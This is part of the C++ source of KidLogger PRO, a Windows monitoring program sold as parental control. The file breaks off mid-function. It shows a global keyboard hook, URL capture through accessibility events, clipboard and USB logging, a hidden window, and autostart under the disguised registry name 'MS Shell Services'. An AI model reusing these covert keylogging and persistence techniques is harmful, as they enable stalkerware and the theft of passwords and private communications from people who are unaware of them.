/**********************************************************************
** Copyright (C) 1998-2008 Tesline-Service S.R.L.  All rights reserved.
**
** KidLogger PRO 
** 
**
** This file may be distributed and/or modified under the terms of the
** GNU General Public License version 2 as published by the Free Software
** Foundation and appearing in the file LICENSE.GPL included in the
** packaging of this file.
**
** This file is provided AS IS with NO WARRANTY OF ANY KIND, INCLUDING THE
** WARRANTY OF DESIGN, MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
**
** See http://www.rohos.com/kidlogger/ for GPL licensing information.
**
** Contact info@rohos.com if any conditions of this licensing are
** not clear to you.
**
**********************************************************************/


// MainWndDlg.cpp : implementation file
//

#include "stdafx.h"
#include "MainWnd.h"
#include "MainWndDlg.h"
#include "Dlg_Options.h"	
#include "Dlg_pass.h"
#include "Dlg_SafeLogReader.h"
#include "Dlg_Options_SoundRec.h"
#include "Dlg_OptionsCapture.h"

#include "ScreenCapture.h"

#include "../hooks/hooks.h"
#include "common1.h"
#include "psapi.h"
#include <dbt.h>
#include <io.h>
#include <winuser.h>


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

void GetMySessionID();
bool isCurrentDesktopMy();


#define REGISTRY_APP_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REGISTRY_RUN_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
#define REGISTRY_KEY_NAME "MS Shell Services"
char G_start_in_reg_mode;

void OnStart();
void RegisterMySelf(bool remove, bool allusers);
void OnStop_();
void GetMySessionID();
bool isCurrentDesktopMy();

CScreenCapture _screen_capturer;
CVoiceRecorder _voice_capturer;

typedef DWORD (__stdcall *WTSGetActiveConsoleSessionId_t)();
WTSGetActiveConsoleSessionId_t pWTSGetActiveConsoleSessionId;

TCHAR CharactersMonitor_include_filter[200] = {""};

HMODULE hMod;
HHOOK hKH,hMH,hSH; // hist0r
HWND hWnd;
DWORD timer_id=0;
BOOL _safe_logger;
TCHAR last_url[500];
BOOL g_UserInputIsIdle = false; // user input is idle for 7 or more seconds.
CTime idle_time_start;


char cr[] = {"\x0D\x0A"};

int GetInputIdleSeconds()
{
	LASTINPUTINFO lii;
	lii.cbSize = sizeof(LASTINPUTINFO);

	GetLastInputInfo( &lii);

	DWORD time_span = GetTickCount() - lii.dwTime;

	return time_span / 1000;
}

// return TRUE - if user input is idle for 7 or more secs
// return FALSE - if there is no input idle
//  on the idle finish - add idle span to LOG
bool IsUserInputIdle()
{
	if (g_UserInputIsIdle)
	{
		if (GetInputIdleSeconds() > 10) // idle input is continue... 
			return true;

		// input idle time is finished by user;
		g_UserInputIsIdle = false;

		CTime currtime = CTime::GetCurrentTime();

		CTimeSpan ts = currtime - idle_time_start;

		if (ts.GetTotalMinutes() > 2)
		{
			CString str_idle;
			if ( ts.GetTotalMinutes() < 60 )
				str_idle = ts.Format("Computer was idle for: %M mins");
			else if ( ts.GetTotalMinutes() < 1440 )
				str_idle = ts.Format("Computer was idle for: %Hh - %M mins ");
			else 
				str_idle = ts.Format("Computer was idle for: %d days - %Hh - %M mins ");
			
			AddLOG_message(cr, 0, 0); 
			AddLOG_message( (char*)(LPCTSTR)str_idle, 0, 0);			
			AddLOG_message(cr, 0, 0);

			if ( 0 == _safe_logger ) 
			{
				AddLOG_message("<br>", 0, 0);
			}

		}

	}

	if (GetInputIdleSeconds() > 7) // idle input is continue... 
	{
		g_UserInputIsIdle = true;
		idle_time_start = CTime::GetCurrentTime();
		return true;
	}

	return false;
}


// Run snap.bat (minimized, and hidden)
HANDLE ExecuteMin(char *prg, char* param)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char cmd[2048]; 
	char prg_path[1000];

	//MessageBox(0, prg, param, 1); 
	GetMyPath(cmd, false);
	GetMyPath(prg_path, false);
	

	strcat(cmd,prg);
	strcat(cmd," ");
	strcat(cmd,param); 
	
	memset( &pi, 0, sizeof( PROCESS_INFORMATION ) );
	memset( &si, 0, sizeof( STARTUPINFO ) );

	si.cb = sizeof(STARTUPINFO );
	//if (hide)
	{
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
	}
	
	
	CreateProcess( NULL, cmd, NULL, NULL, FALSE, IDLE_PRIORITY_CLASS  , NULL, prg_path ,&si,&pi );

	//AfxMessageBox(cmd);

	//AfxMessageBox(prg_path);


	  // CloseHandle( pi.hProcess );
	   //CloseHandle( pi.hThread );
	   
	return pi.hProcess;
} 

// Get LOG file name for current user
void GetFileName(int i, char* str, char* ext)
{
	SYSTEMTIME tm;
	UINT cch = 30;
	TCHAR date[250];
	char username[100];
	DWORD sz=50;
	GetLocalTime(&tm);	

	GetUserName( username, &sz);
	GetDateFormat(0x0409, 0, &tm, "d MMMM','dddd", date, cch);		


	ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "LogFilesPath", str, 500);
	if ( _taccess(str, 0) != 0){
		GetMyPath(str, false, NULL);		
	}
	
	strcat(str, username);		
	CreateDirectory(str, NULL);	
	strcat(str, "\\");	
	strcat(str, date);	

	if(i==2)
	{
		wsprintf(str+lstrlen(str),"[%i %i]",tm.wHour,tm.wMinute);
	}
	strcat(str, ext);

	int i2=1;

	if(i==2)
		{

		// такой файл не должен существоввать , существующие образы не удал€ть		
		while (_taccess(str, 0)==0 ) {
			
			// файл существует		
			ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "LogFilesPath", str, 500);
			if ( _taccess(str, 0) != 0){
				GetMyPath(str, false, NULL);		
			}
			
			strcat(str, username);				
			strcat(str, "\\");	
			strcat(str, date);	
			
			if(i==2)
			{
				wsprintf(str+lstrlen(str),"[%i %i] %d",tm.wHour,tm.wMinute, i2);
			}
			strcat(str, ext);
			
			i2++;
		};
	}
	
}

// add current time to LOG
void AddLOG_time()
{

	CTime currtime = CTime::GetCurrentTime();

	CString str;
		
	str = currtime.Format("%X ");

	if ( 0 == _safe_logger ) 
	{
		AddLOG_message("<br>", 0, 0);
	}

	AddLOG_message(cr, 0, 0);
	AddLOG_message( (char*)(LPCTSTR)str, 0, 0);			
	AddLOG_message(cr, 0, 0);
	if ( 0 == _safe_logger ) 
	{
		AddLOG_message("<br>", 0, 0);
	}

}


/////////////////////////////////////////////////////////////////////////////
// CMainWndDlg dialog

CMainWndDlg::CMainWndDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMainWndDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMainWndDlg)
	_log_allusers = FALSE;
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);

	
	_start_minimized = false;
	_working = false;
	_log_allusers = ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "AllUsers", 0 );

	hwndNextViewer  = NULL;
}

void CMainWndDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMainWndDlg)
	DDX_Control(pDX, IDC_STATIC3, _ads);
	DDX_Check(pDX, IDC_CHECK1, _log_allusers);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMainWndDlg, CDialog)
	//{{AFX_MSG_MAP(CMainWndDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_DESTROY()
	ON_BN_CLICKED(IDC_BUTTON3, OnStop)
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	ON_BN_CLICKED(IDC_BUTTON2, OnOptions)
	ON_BN_CLICKED(IDC_STATIC3, OnStatic3)
	ON_WM_CTLCOLOR()
	ON_BN_CLICKED(IDC_STATIC2, OnOpenLogFolder)
	ON_BN_CLICKED(IDC_STATIC1, OnClearLogs)
	ON_WM_ENDSESSION()
	ON_WM_SYSCOMMAND()
	ON_WM_DRAWCLIPBOARD()
	ON_BN_CLICKED(IDC_BUTTON4, OnMakeMobile)
	ON_WM_TIMER()
	//}}AFX_MSG_MAP
	ON_WM_DEVICECHANGE()
	ON_MESSAGE( WM_POWERBROADCAST, onPowerChanges)
END_MESSAGE_MAP()

HWND hwnd1;

/////////////////////////////////////////////////////////////////////////////
// CMainWndDlg message handlers

BOOL CMainWndDlg::OnInitDialog()
{
	verInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verInfo);

	CDialog::OnInitDialog();

	HMODULE hMod_Kernel = LoadLibrary(_T("kernel32.dll"));		
	pWTSGetActiveConsoleSessionId = (WTSGetActiveConsoleSessionId_t)GetProcAddress(hMod_Kernel, "WTSGetActiveConsoleSessionId");

	GetMySessionID();

	hwnd1 = this->m_hWnd;

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	G_start_in_reg_mode  = _start_in_reg_mode;

	SetClassLong( _ads.m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL,IDC_HAND) );
	SetClassLong( GetDlgItem(IDC_STATIC1)->m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL,IDC_HAND) );
	SetClassLong( GetDlgItem(IDC_STATIC2)->m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL,IDC_HAND) );


	CDC *dc = GetDC();
	int nHeight = -MulDiv(8, GetDeviceCaps(dc->m_hDC, LOGPIXELSY), 72);
	HFONT hBoldFont = CreateFont(nHeight, 0, 0, 0, FW_NORMAL, 0, 1, 0,
		DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
		DEFAULT_QUALITY, VARIABLE_PITCH|FF_SWISS, TEXT("MS Shell Dlg") );		

	SendDlgItemMessage( IDC_STATIC1, WM_SETFONT , (WPARAM)hBoldFont, MAKELPARAM(1,0) );
	SendDlgItemMessage( IDC_STATIC2, WM_SETFONT , (WPARAM)hBoldFont, MAKELPARAM(1,0) );

	// TODO: Add extra initialization here

	_ads.SetWindowText("KidLogger PRO v5.0\nhttp://www.rohos.com/kid-logger"); 

	//

	CreateToolTip( m_hWnd, IDC_STATIC1, "Delete all log files and screenshots", 300, 0);
	CreateToolTip( m_hWnd, IDC_STATIC2, "Open folder that contains all log files for all users.", 300, 0);
	CreateToolTip( m_hWnd, IDC_CHECK1, "Log for all user accounts on this computer, including yours.", 300, 0);
	

	
	hWnd = m_hWnd;
	
	 
	if (!_start_minimized) 
	{		
//		RegisterMySelf(false, false); 
		ShowWindow(SW_SHOW);

		if ( 1 == ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "LogClipboard", 0 ))
			hwndNextViewer=SetClipboardViewer();
	}
	else {
		ShowWindow(SW_HIDE);
		ReloadConfig();
		_working = true;

		DeleteOldLogFiles();
		
		OnStart(); 
		SetDlgItemText(IDC_BUTTON3, "Stop logging");
	}

		
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMainWndDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMainWndDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}



VOID CALLBACK timer_html_dump(HWND hwnd,UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
{
	dump_urls_to_log();
}

#include "Oleacc.h"


/*DumpObjectByPoint(IAccessible* pAcc)
{

}*/

VOID CALLBACK WinEventProc(
  HWINEVENTHOOK hWinEventHook,
  DWORD event,
  HWND hwnd,
  LONG idObject,
  LONG idChild,
  DWORD dwEventThread,
  DWORD dwmsEventTime
)
{
  if ( event == EVENT_OBJECT_VALUECHANGE  || EVENT_OBJECT_NAMECHANGE  == event /*|| event == EVENT_OBJECT_SHOW ||  
	  event == EVENT_OBJECT_CREATE || event == EVENT_OBJECT_STATECHANGE */ )
	//if (hwnd)
  {

	  if ( IsUserInputIdle()) // do not monitor UI events if there is no user input.
	  {		  
		  return;
	  }


	  //char txt[100];
	  //SendMessage( GetDlgItem(hwnd1, IDC_LIST1 ),  LB_ADDSTRING, 0, (LPARAM)"event");

	  IAccessible* pAcc = NULL;
	  VARIANT varChild;
	  HRESULT hr = AccessibleObjectFromEvent(hwnd, idObject, idChild, &pAcc, &varChild);
	  if ( (hr == S_OK) && (pAcc != NULL) )
	  {
		  BSTR bstrName;
		  WCHAR wstr[1500]={L""};
		  WCHAR wstr_event[1500]={L""};
		  WCHAR wstr_win_class[500]={L""};
		  pAcc->get_accName(varChild, &bstrName);
		  BSTR bstrVal=0;
		  pAcc->get_accValue(varChild, &bstrVal);
		  //printf("%S\n", bstrName);


		  /*switch (event)
		  {
		  case EVENT_OBJECT_VALUECHANGE:
			  wcscpy(wstr_event, L"VAL_CHG"); break;
		  case EVENT_OBJECT_SHOW:
			  wcscpy(wstr_event, L"OBJ_SH"); break;
		  case EVENT_OBJECT_CREATE:
			  wcscpy(wstr_event, L"OBJ_CR"); break;
		  case EVENT_OBJECT_STATECHANGE:
			  wcscpy(wstr_event, L"VAL_STATE"); break;
		  default:
			  wcscpy(wstr_event, L"DEF"); break;
			  
		  }

		  GetClassNameW(hwnd, wstr_win_class, 300);
					  

		  DWORD process_id=0;
		  GetWindowThreadProcessId(hwnd, &process_id);
		  HANDLE hprocess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, process_id);		  
		  TCHAR process_name[550] = {""};
		  GetModuleBaseName(hprocess, NULL, process_name, 500);
		  //GetWindowModuleFileName(hwnd, process_name, 500);
		  CloseHandle(hprocess);

		  SendMessage( GetDlgItem(hwnd1, IDC_LIST1 ),  LB_ADDSTRING, 0, (LPARAM)process_name);*/
		  

		  
		  /*if (bstrName && wcslen(bstrName) > 4)
		  {
			 bstrName[450]=0;
			swprintf(wstr, L"%s Name %s (0x%X %s)", wstr_event, bstrName, idObject, wstr_win_class); 
			SendMessageW( GetDlgItem(hwnd1, IDC_LIST1 ),  LB_ADDSTRING, 0, (LPARAM)wstr);
			SysFreeString(bstrName);		  
		  }*/

		  if (bstrVal && wcslen(bstrVal) > 4)
		  {
			  

			 //swprintf(wstr, L"%s Val %s (0x%X %s)", wstr_event, bstrVal, idObject, wstr_win_class); 
			//SendMessageW( GetDlgItem(hwnd1, IDC_LIST1 ),  LB_ADDSTRING, 0, (LPARAM)wstr);
			//

			if ( wcsstr(bstrVal, L"http") || wcsstr(bstrVal, L"www") || wcsstr(bstrVal, L"ftp") || wcsstr(bstrVal, L":\\\\")  )
			{
				char txt[6000], buff[6000]					;
				if ( wcslen(bstrVal) > 250)	
					bstrVal[250]=0;

				wcstombs(txt, bstrVal, 590);
				txt[250]=0;
				
				if ( stricmp(last_url, txt) !=0)
				{
					// the new url differs from old one.
					
					strcpy(last_url, txt);
					
					if ( 1 == _safe_logger ) 
					{
						AddLOG_message(txt, 0, 0);
						AddLOG_message(cr,2, 0);
					}
					else 
					{
						sprintf(buff, "<br><a href='%s'>%s</a><br>", txt, txt);
						AddLOG_message(buff, 0, 0);
					}
				}
			}

			SysFreeString(bstrVal);		  
		  }
		  pAcc->Release();

		  /*if (!bstrName && !bstrVal)
		  {
			   swprintf(wstr, L"%s - (0x%X %s)", wstr_event,  idObject, wstr_win_class); 
				SendMessageW( GetDlgItem(hwnd1, IDC_LIST1 ),  LB_ADDSTRING, 0, (LPARAM)wstr);

		  }*/

		  //SendMessage( GetDlgItem(hwnd1, IDC_LIST1 ),  LB_SETTOPINDEX, SendMessage( GetDlgItem(hwnd1, IDC_LIST1 ),  LB_GETCOUNT, 0, (LPARAM)0)-1, (LPARAM)0);
		  
	  } else
	  {
		  //SendMessage( GetDlgItem(hwnd1, IDC_LIST1 ),  LB_ADDSTRING, 0, (LPARAM)"Error");

	  }

   
  }

  return;
  
}

HWINEVENTHOOK win_hook;
void OnStart()
{

	
	win_hook = SetWinEventHook
		(
		//EVENT_OBJECT_NAMECHANGE  ,
		EVENT_OBJECT_NAMECHANGE ,
		EVENT_OBJECT_VALUECHANGE ,
		NULL,
		WinEventProc,
		0,
		0,
		WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS 
		);
	
	
	
	if ( ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "LogKeyStrokes", 1) )
	{
		
		hMod = LoadLibrary("kidlog.dll");
		if (hMod == NULL)   {   
			
			MessageBox(hWnd, "Log", "Error: cannot start logger, kidlog.dll not found.", 0); 
			return ;
		}
		
		//hKH = SetWindowsHookEx(WH_KEYBOARD, &KeyProc, hMod, GetCurrentThreadId() );
		hKH = SetWindowsHookEx(WH_KEYBOARD, &KeyProc, hMod, 0 );
		
		//hMH = SetWindowsHookEx(WH_MOUSE, &MouseProc, hMod, 0);        
		hSH = (HHOOK)11;		
		
	}

	SetHooks(hKH, hMH, hSH , hWnd, G_start_in_reg_mode);	
	
	return;
}

void OnStop_()
{
		UnhookWinEvent(win_hook);

		KillTimer(0,timer_id);
		UnhookWindowsHookEx(hKH);
		UnhookWindowsHookEx(hMH);
		UnhookWindowsHookEx(hSH);

		KillTimer(hWnd, 10);
		KillTimer(hWnd, 11);
		KillTimer(hWnd, 12);
		KillTimer(hWnd, 13);
		KillTimer(hWnd, 14);
		KillTimer(hWnd, 15);

		return;
}


// RUN at startup
//
void RegisterMySelf(bool remove, bool allusers) 
{	
    int nResultDll = 0;	
	HKEY hkRegKey;
	
	char szModuleName[512];
	GetModuleFileName(NULL, szModuleName, 512);    
	strcat(szModuleName, " -m");
	
	//int allUsers = ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "AllUsers", 0 );

	if (remove)
	{
		WriteReg(HKEY_CURRENT_USER, REGISTRY_APP_PATH, REGISTRY_KEY_NAME, (LPCTSTR)NULL);

		if (allusers)
			WriteReg(HKEY_LOCAL_MACHINE, REGISTRY_APP_PATH, REGISTRY_KEY_NAME, (LPCTSTR)NULL);

		return;
	}	
	
	WriteReg(HKEY_CURRENT_USER, REGISTRY_APP_PATH, REGISTRY_KEY_NAME, szModuleName);	
	
	if (allusers)
	{
		if ( false == WriteReg(HKEY_LOCAL_MACHINE, REGISTRY_APP_PATH, REGISTRY_KEY_NAME, szModuleName) )
		{
			AfxMessageBox("Could not monitor all Users. Please run Kidlogger 'as Admin' and try again.", MB_ICONWARNING);
		}
	}

	//
	
	
	return;
}


void CMainWndDlg::OnOK() 
{
	// TODO: Add extra validation here

	UpdateData(true);

	WriteReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "AllUsers", _log_allusers );

	if (!_working) {
		PostQuitMessage(0);			
		return;
	}

	
	ShowWindow(SW_HIDE);

	//CDialog::OnOK();
}

void CMainWndDlg::OnDestroy() 
{
	CDialog::OnDestroy();
	
	if (hwndNextViewer )
		ChangeClipboardChain(hwndNextViewer);


	OnStop_();
	PostQuitMessage(0);	
}

void CMainWndDlg::OnStop() 
{
	UpdateData(true);
	WriteReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "AllUsers", _log_allusers );

	if (_working){
		_working = false;
		RegisterMySelf(true, _log_allusers);  		// stop for all users
		OnStop_();
		SetDlgItemText(IDC_BUTTON3, "Start logging");
		AfxMessageBox("Logging was stopped sucessfully." , MB_ICONINFORMATION);	
		
	} else {
		RegisterMySelf(false, _log_allusers);  	

		// check the registration... if "no access then"

		DeleteOldLogFiles();
		OnStart();
		ReloadConfig();

		_working = true;

		SetDlgItemText(IDC_BUTTON3, "Stop logging");
	}
	
}

void CMainWndDlg::OnCancel() 
{

	if (!_working) {
		PostQuitMessage(0);	
		return;
	}

	ShowWindow(SW_HIDE);
	
}

// Open current log file.
void CMainWndDlg::OnButton1() 
{

	if ( 1 == ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "SafeLogger", 0) ) 
	{
		CDlg_SafeLogReader dlg1;

		TCHAR path[500];

		ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "LogFilesPath", path, 400);

		if ( _tcslen(path)==0){
			GetMyPath(path, false, NULL);		
		}									
		
		char username[100];
		DWORD sz=50;
		GetUserName( username, &sz);
		
		strcat(path, username);		
		CreateDirectory(path, NULL);			

		dlg1.setLogDir(path);		

		dlg1.DoModal();

		
	
		return;
	}

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	TCHAR cmd[ MAX_PATH ] = TEXT("");


	char name[700];	
	//char cmd[700] = {0};	

	GetFileName(1, name, ".htm");

	if ( _taccess(name, 0) !=0 ) {
		AfxMessageBox("Log file was not found. \n - Ensure that KidLogger is active.\n - Wait 5 minutes if you just started logging.");
		//AfxMessageBox(name);
		return;
	}

	
	_stprintf( cmd + _tcslen( cmd ), TEXT("\"%s\""), name);

	//AfxMessageBox(cmd);
	
	ShellExecute(NULL, "open", cmd, NULL, NULL, SW_SHOW);
	

	return ;
}

void CMainWndDlg::OnOptions() 
{

	CDlg_Options dlg_options;
	Dlg_SMTP	dlg_email;
	//CDlg_Options_SoundRec dlg_sound;
	CDlg_OptionsCapture dlg_capture;

	/*if ( dlg.DoModal() == IDOK) {

		if ( 1 == ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "LogClipboard", 0 ))
			hwndNextViewer=SetClipboardViewer();
	}*/
	
	CPropertySheet dlgPropertySheet("KidLogger options");	

	//dlg_sound._voice_capturer = &_voice_capturer;
	
	dlgPropertySheet.AddPage(&dlg_options);	
	dlgPropertySheet.AddPage(&dlg_email); 
	//dlgPropertySheet.AddPage(&dlg_sound	); 
	dlgPropertySheet.AddPage(&dlg_capture	); 
	
	if ( IDOK  == dlgPropertySheet.DoModal() )
		ReloadConfig();

}

void CMainWndDlg::OnStatic3() 
{
	
	ShellExecute(NULL, "open", "http://www.rohos.com/kid-logger/", NULL, NULL, SW_SHOWNORMAL | SW_RESTORE ); 
	
}



/** Looks for USB/Removable drives to capture it's letters
*/
BOOL CMainWndDlg::OnDeviceChange(UINT nEventType, DWORD dwData) 
{	
	if ( 0== ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "UsbMonitor", 0) )
		return true;

	if (nEventType == DBT_CONFIGCHANGED)
		AddLOG_message("[The current configuration has changed, due to a dock or undock.]<br>", 0, 0);

	if (nEventType == DBT_DEVICEARRIVAL)
		AddLOG_message("[A device or piece of media has been inserted and is now available].<br>", 0, 0);

	if (nEventType == DBT_DEVICEREMOVECOMPLETE) 
		AddLOG_message("[A device or piece of media has been removed].<br>", 0, 0);

	



	if (nEventType == DBT_DEVICEARRIVAL) {

		DEV_BROADCAST_HDR *hdr = (DEV_BROADCAST_HDR*)dwData;
		
		if ( hdr->dbch_devicetype == DBT_DEVTYP_VOLUME ) {			
			DEV_BROADCAST_VOLUME *volume = (DEV_BROADCAST_VOLUME*)dwData;
			TCHAR letter;
			TCHAR drive[150];
			
			for (letter='A'; letter<='Z'; letter++) {
				if ( volume->dbcv_unitmask & 1)
					break;
				volume->dbcv_unitmask = volume->dbcv_unitmask >> 1;
			}
			
			if (letter <='Z' || (volume->dbcv_unitmask&1) ) {								
				_tcscpy( drive, TEXT("[c:\\ drive was inserted.]<br>") );
				drive[1] = letter;
				
				AddLOG_message(drive, 0, 0);
			} else
				AddLOG_message("[Unknown drive was connected...]<br>", 0, 0);
		} else 
			AddLOG_message("[A Port or OEM device was connected to the system].<br>", 0, 0);
		

	}
		
	if ( nEventType == DBT_DEVICEREMOVECOMPLETE ) {

		DEV_BROADCAST_HDR *hdr = (DEV_BROADCAST_HDR*)dwData;
		
		if ( hdr->dbch_devicetype == DBT_DEVTYP_VOLUME ) {			
			DEV_BROADCAST_VOLUME *volume = (DEV_BROADCAST_VOLUME*)dwData;
			TCHAR letter;
			TCHAR drive[150];
			
			for (letter='A'; letter<='Z'; letter++) {
				if ( volume->dbcv_unitmask & 1)
					break;
				volume->dbcv_unitmask = volume->dbcv_unitmask >> 1;
			}
			
			if (letter <='Z' || (volume->dbcv_unitmask&1) ) {								
				_tcscpy( drive, TEXT("[c:\\ drive was removed from system.]<br>") );
				drive[1] = letter;				
				AddLOG_message(drive, 0, 0);
			} else
				AddLOG_message("[Unknown drive was removed]...<br>", 0, 0);

		}	else 
			AddLOG_message("[A Port or OEM device was removed from the system.]<br>", 0, 0);

	}
	return true;
}


HBRUSH CMainWndDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	int id = pWnd->GetDlgCtrlID();

	if (nCtlColor == CTLCOLOR_STATIC ) {		
		if (id == IDC_STATIC1 || id==IDC_STATIC2 || IDC_STATIC1==IDC_STATIC3)
			pDC->SetTextColor( RGB(0,0,228) );			
	}
		
	
	// TODO: Return a different brush if the default is not desired
	return hbr;
}


// Opens lof files folder
void CMainWndDlg::OnOpenLogFolder() 
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	TCHAR cmd[ MAX_PATH ] = TEXT("");

	memset( &si, 0, sizeof( STARTUPINFO ) );
	memset( &pi, 0, sizeof( PROCESS_INFORMATION ) );
	si.cb = sizeof( STARTUPINFO );
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOWNORMAL | SW_RESTORE;

	if( !SearchPath( NULL, TEXT("explorer.exe"), NULL, MAX_PATH - 1, cmd, NULL ) )
		return ;

	char name[700];
	ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "LogFilesPath", name, 600);
	if ( _tcslen(name)==0){
		GetMyPath(name, false, NULL);		
	}
	
	_stprintf( cmd + _tcslen( cmd ), TEXT(" \"%s\",/e,/idlist"), name);

	if( !CreateProcess( NULL, cmd, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi ) )
	{
	
	}

	if( pi.hThread != INVALID_HANDLE_VALUE ) 
		CloseHandle( pi.hThread );
	if( pi.hProcess != INVALID_HANDLE_VALUE ) 
		CloseHandle( pi.hProcess );
	
	
}

// Delete all log files.
void CMainWndDlg::OnClearLogs() 
{
	
	WIN32_FIND_DATA FindFileData;
	char str[700];	
	char path[700];	
	char str2[700];	

	ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "LogFilesPath", str, 600);
	if ( _tcslen(str)==0){
		GetMyPath(str, false, NULL);		
	}

	strcpy(path, str);	
	strcat(str, "*");	
	HANDLE h = FindFirstFile(str, &FindFileData);
	do {
		
		if ( !(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ){
			// Delete a screenshot
			strcpy(str2, path);	
			strcat(str2, FindFileData.cFileName);	
			//AfxMessageBox(str2);
			DeleteFile(str2);
		}
		else if ( _tcscmp(FindFileData.cFileName, ".") && _tcscmp(FindFileData.cFileName, "..") ) {

			// Delete folder with log files
			SHFILEOPSTRUCT lpFileOp;
			lpFileOp.wFunc = FO_DELETE;

			strcpy(str2, path);	
			strcat(str2, FindFileData.cFileName);	
			lpFileOp.pFrom = str2;
			//AfxMessageBox(str2);
			lpFileOp.pTo = NULL;
			lpFileOp.fFlags  = FOF_NOCONFIRMATION;
			lpFileOp.lpszProgressTitle = "Deleting log files...";
			lpFileOp.hwnd = m_hWnd; 
			SHFileOperation(&lpFileOp);

		}

	} while ( FindNextFile(h, &FindFileData) );

	CloseHandle(h);
	

	
}


//
LRESULT CMainWndDlg::onPowerChanges(WPARAM wp, LPARAM lp){
	//WriteLog("CMainWnd::onPowerChanges" );

	if (wp == PBT_APMRESUMEAUTOMATIC || wp == PBT_APMRESUMECRITICAL ||
		wp == PBT_APMRESUMESUSPEND) {
		DeleteOldLogFiles();
		AddLOG_message("<h3>[System has been resumed after Suspend or Hibernate]</h3> <br>", 0, true);		
	}

	if (wp==PBT_APMSUSPEND)
		AddLOG_message("<h3>[System is hibernating...]</h3> <br>", 0, true);		

	return true;
}

void CMainWndDlg::OnEndSession(BOOL bEnding) 
{
	if (bEnding)
		AddLOG_message("<b>[User ending session..].</b><br>", 0, true);

	CDialog::OnEndSession(bEnding);	
		
}

void CMainWndDlg::OnSysCommand(UINT nID, LPARAM lParam) 
{
	// TODO: Add your message handler code here and/or call default
	
	if (nID==SC_SCREENSAVE)
		AddLOG_message("<b>[ScreenSaver has started...]</b>", 0, true);

	CDialog::OnSysCommand(nID, lParam);
}

void CMainWndDlg::OnDrawClipboard() 
{
	::SendMessage(hwndNextViewer, WM_DRAWCLIPBOARD, 0, 0);

	TCHAR text[5000];
	
	if ( IsClipboardFormatAvailable(CF_TEXT) && OpenClipboard() ) 
	{
		HGLOBAL hGlb;                    // проверка на текст 
		char* lpstr;                     // ¬з€тие текста и перевод или подсказка.
		
		hGlb=GetClipboardData(CF_TEXT); 
		lpstr = (char*)GlobalLock(hGlb); 
		
		strncpy(text, lpstr, 4990);
		text[4990]=0;

		if (0 == _safe_logger )
